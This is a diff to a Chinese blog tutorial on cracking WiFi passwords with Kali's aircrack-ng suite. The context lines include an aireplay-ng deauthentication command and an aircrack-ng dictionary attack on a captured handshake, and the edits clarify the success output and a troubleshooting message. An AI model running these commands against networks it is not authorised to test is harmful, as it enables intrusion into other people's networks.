@@ -129,7 +129,7 @@ root@kali:~# aireplay-ng -0 20 -a 80:xx:xx:xx:xx:28 -c 18:yy:yy:yy:yy:40 wlan0mo
 root@kali:~# aircrack-ng -w /home/common.txt /home/ChinaNet-LRRV-01.cap 
 ```
 
-出现**KEY FOUND**，则表示破解成功。
+出现**KEY FOUND**，则表示破解成功，括号中字符串即为密码。
 
 ![image-20200627124422162](/images/posts/2020-06-26-Kali+Airmon+WiFi破解.assets/image-20200627124422162.png)
 
@@ -148,7 +148,7 @@ root@kali:~# airmon-ng stop wlan0mon
 实操过程中，可能出现：
 
 - 扫描wifi过程中，无法收集到wifi信息
-- 抓包中出现
+- 抓包中出现：fixed channel wlan0mon xx
 
 注意：拔掉无线网卡重新插入，或者重启虚拟机。
 
